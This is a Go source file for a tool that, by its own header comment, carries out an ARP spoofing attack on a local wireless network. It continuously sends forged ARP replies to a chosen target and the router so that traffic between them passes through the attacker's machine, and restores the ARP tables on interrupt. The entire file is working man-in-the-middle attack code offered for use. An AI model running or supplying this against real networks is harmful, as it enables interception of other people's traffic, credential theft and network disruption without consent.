// Program to execute an ARP spoofing attack on the local wireless network
package arpspoof

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"

	"github.com/fatih/color"
	"github.com/mdlayher/arp"
	"github.com/tj/go-spin"
)

// ArpSpoof sends ARP replies to the router spoofing the target MAC and to the target spoofing the router MAC
func ArpSpoof(networkInterface string, routerIP net.IP, targetIP net.IP) {
	client := arpClient(networkInterface)

	routerMAC, err := client.Resolve(routerIP)
	if err != nil {
		printErrorAndExit("Could not resolve router MAC address")
	}
	fmt.Printf("> Router MAC:\t %v\n", routerMAC)

	targetMAC, err := client.Resolve(targetIP)
	if err != nil {
		printErrorAndExit("Could not resolve target MAC address")
	}
	fmt.Printf("> Target MAC:\t %v\n", targetMAC)

	attackerMAC := client.HardwareAddr()
	fmt.Printf("> Own MAC:\t %v\n\n", attackerMAC)

	restoreArpTablesOnInterrupt(client, routerMAC, routerIP, targetMAC, targetIP)

	s := spin.New() // displays spinning wheel in terminal
	for {           // continuously send ARP spoofing packets until interrupt
		color.New(color.FgCyan).Print("\r\tARP spoofing... ")
		color.New(color.FgWhite).Print(s.Next() + "  ")
		time.Sleep(100 * time.Millisecond)

		// Tells target that the router's MAC is this computer's MAC
		sendArpReply(client, attackerMAC, routerIP, targetMAC, targetIP)
		// Tells router that the target's MAC is this computer's MAC
		sendArpReply(client, attackerMAC, targetIP, routerMAC, routerIP)
	}
}

func arpClient(networkInterface string) *arp.Client {
	wifi, err := net.InterfaceByName(networkInterface)
	if err != nil {
		printErrorAndExit("Could not find interface " + networkInterface)
	}
	client, err := arp.Dial(wifi)
	if err != nil {
		printErrorAndExit("Could not create ARP client")
	}
	err = client.SetReadDeadline(time.Now().Add(2 * time.Second))
	if err != nil {
		printErrorAndExit("Could not create ARP client")
	}
	return client
}

func restoreArpTablesOnInterrupt(client *arp.Client, routerMAC net.HardwareAddr,
	routerIP net.IP, targetMAC net.HardwareAddr, targetIP net.IP) {
	// Listen for interrupt signal
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		<-c
		fmt.Printf("\n\nReverting ARP tables...\n")
		for i := 0; i < 10; i++ {
			sendArpReply(client, routerMAC, routerIP, targetMAC, targetIP)
			sendArpReply(client, targetMAC, targetIP, routerMAC, routerIP)
		}
		fmt.Println("Exit")
		os.Exit(0)
	}()
}

func sendArpReply(client *arp.Client, sourceMAC net.HardwareAddr, sourceIP net.IP,
	destMAC net.HardwareAddr, destIP net.IP) {
	p, err := arp.NewPacket(arp.OperationReply, sourceMAC, sourceIP, destMAC, destIP)
	if err != nil {
		printErrorAndExit("Could not create ARP packet")
	}
	err = client.WriteTo(p, destMAC)
	if err != nil {
		printErrorAndExit("Could not send ARP packet")
	}
}

func printErrorAndExit(msg string) {
	color.Red("Error: " + msg)
	os.Exit(1)
}
